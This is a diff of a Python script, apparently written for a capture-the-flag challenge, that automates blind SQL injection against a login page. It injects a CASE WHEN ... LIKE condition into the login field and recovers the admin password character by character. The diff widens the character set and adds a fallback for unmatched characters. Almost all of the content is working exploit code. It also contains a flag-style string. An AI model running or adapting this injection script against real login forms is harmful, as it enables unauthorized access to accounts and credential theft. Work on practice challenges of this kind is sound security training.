@@ -1,4 +1,5 @@
 import requests
+import string
 
 baseurl = 'http://chall.pwn-with.me/?page=login'
 
@@ -31,17 +32,22 @@ print postData('admin', 'kapo{j_s_bach_french_suites}')
 
 payload = "fqwrlqwrhqwklhflqfi123123' or CASE WHEN id='admin' AND pw LikE '"
 
-printable = "abcdefghijklmnopqrstuvwxyz0123456789i{}_"
-
 payend = "%' THEN TRUE ELSE FALSE END or id='godj3' order by id asc -- a"
 
 key = ''
 
 for k in range(100):
-    for i in printable:
+    check = False
+    for i in string.printable:
+        if i == '_' or i == '!' or i == '#' or i == '%' or i == '\'' or i == '\"' or i == '(' or i == ')' or i == '*' or i == '+' or i == '-' or i == '&' or i == '|' or i == '>' or i == '<' or i == '=' or i == '?' or i == '~' or i == ',':
+            continue
         # print key + i,
         # print postData(payload + i + payend, 'godj3')
         if not postData(payload + key + i + payend, 'godj3'):
             print key + i
             key = key + i
+            check = True
             break
+
+    if check == False:
+        key += '_'
